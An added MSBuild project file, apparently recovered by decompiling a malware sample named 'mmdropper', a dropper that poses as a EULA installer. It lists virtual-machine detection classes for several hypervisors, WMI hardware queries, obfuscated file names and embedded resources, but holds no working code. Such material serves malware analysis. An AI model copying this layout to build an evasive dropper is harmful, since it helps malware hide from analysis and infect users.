@@ -1,0 +1,89 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="12.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!--Project was exported from assembly: C:\Users\victim\Downloads\AgileStringDecryptor-master\bin\Debug\net48\eulascr-StrDec.exe-->
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{2EC011A9-92DE-4DAE-9896-736643B3995C}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AssemblyName>mmdropper</AssemblyName>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <TargetFrameworkProfile />
+    <ApplicationVersion>1.0.7321.42228</ApplicationVersion>
+    <FileAlignment>512</FileAlignment>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.ServiceProcess" />
+    <Reference Include="System.Web.Extensions" />
+    <Reference Include="System.Windows.Forms" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="_003CModule_003E.cs" />
+    <Compile Include="IVirtualEnvironment.cs" />
+    <Compile Include="BaseVirtualEnvironment.cs" />
+    <Compile Include="HyperVMachine.cs" />
+    <Compile Include="QEmuMachine.cs" />
+    <Compile Include="VirtualBoxMachine.cs" />
+    <Compile Include="VirtualPcMachine.cs" />
+    <Compile Include="VmWareMachine.cs" />
+    <Compile Include="VmWarePlayer.cs" />
+    <Compile Include="VirtualMachineDetector.cs" />
+    <Compile Include="BaseWin32Entity.cs" />
+    <Compile Include="BiosCharacteristics.cs" />
+    <Compile Include="BIOS.cs" />
+    <Compile Include="ComputerSystem.cs" />
+    <Compile Include="DiskDrive.cs" />
+    <Compile Include="MotherboardDevice.cs" />
+    <Compile Include="PnPEntity.cs" />
+    <Compile Include="WindowsService.cs" />
+    <Compile Include="oxM=.cs" />
+    <Compile Include="InitializeDelegate.cs" />
+    <Compile Include="ExitDelegate.cs" />
+    <Compile Include="{FE3C441D-DF9D-407b-917D-0B4471A8296C}.cs" />
+    <Compile Include="mmdropper\eulaform.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="mmdropper\MainForm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="mmdropper\Program.cs" />
+    <Compile Include="dummy\{938c5dc8-04a9-4b3c-8a37-3ff1733a3819}.cs" />
+    <Compile Include="dummy_ptr\{ab647330-7f26-4876-817c-8014760cf6f2}.cs" />
+    <Compile Include="AssemblyInfo.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="5a530dfd-bc51-4992-a05d-f09d41a331d4" />
+    <EmbeddedResource Include="d030ea86-a65f-4973-bac9-d77cf1987632" />
+    <EmbeddedResource Include="mmdropper\eulaform.resx" />
+    <EmbeddedResource Include="mmdropper\MainForm.resx" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.config" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
